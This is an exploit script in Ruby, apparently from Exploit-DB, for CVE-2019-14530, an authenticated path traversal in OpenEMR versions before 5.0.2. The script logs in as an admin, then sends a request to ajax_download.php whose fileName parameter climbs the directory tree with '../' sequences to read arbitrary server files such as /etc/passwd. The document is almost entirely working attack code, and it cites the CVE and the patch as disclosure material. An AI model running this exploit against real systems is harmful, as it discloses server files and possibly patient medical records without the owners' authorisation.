# Title: OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)
# Exploit author: noraj (Alexandre ZANNI) for SEC-IT (http://secit.fr)
# Exploit source: https://github.com/sec-it/exploit-CVE-2019-14530
# Date: 2021-06-24
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_7.tar.gz
# Docker PoC: https://github.com/sec-it/exploit-CVE-2019-14530/blob/master/docker-compose.yml
# Version: < 5.0.2 (it means up to 5.0.1.7)
# Tested on: OpenEMR Version 5.0.1
# References: https://www.exploit-db.com/exploits/50037
# CVE: CVE-2019-14530
# CWE: CWE-22
# Patch: https://github.com/openemr/openemr/pull/2592/files

#!/usr/bin/env ruby

require 'pathname'
require 'httpx'
require 'docopt'

doc = <<~DOCOPT
  OpenEMR < 5.0.2 - (Authenticated) Path Traversal - Local File Disclosure

  Source: https://github.com/sec-it/exploit-CVE-2019-14530

  Usage:
    #{__FILE__} exploit <url> <filename> <username> <password> [--debug]
    #{__FILE__} -h | --help

  Options:
    <url>       Root URL (base path) including HTTP scheme, port and root folder
    <filename>  Filename of the file to be read
    <username>  Username of the admin
    <password>  Password of the admin
    --debug     Display arguments
    -h, --help  Show this screen

  Examples:
    #{__FILE__} exploit http://example.org/openemr /etc/passwd admin pass
    #{__FILE__} exploit https://example.org:5000/ /etc/passwd admin pass
DOCOPT

def login(root_url, user, pass, http)
  vuln_url = "#{root_url}/interface/main/main_screen.php?auth=login&site=default"
  params = {
    'new_login_session_management' => '1',
    'authProvider' => 'Default',
    'authUser' => user,
    'clearPass' => pass,
    'languageChoice' => '1'
  }

  http.post(vuln_url, form: params).body.to_s
end

def exploit(root_url, filename, http)
  vuln_url = "#{root_url}/custom/ajax_download.php?fileName=../../../../../../../../../#{filename}"

  http.get(vuln_url).body.to_s
end

begin
  args = Docopt.docopt(doc)
  pp args if args['--debug']

  if args['exploit']
    http = HTTPX.plugin(:cookies).plugin(:follow_redirects)
    login(args['<url>'], args['<username>'], args['<password>'], http)
    puts exploit(args['<url>'], args['<filename>'], http)
  end
rescue Docopt::Exit => e
  puts e.message
end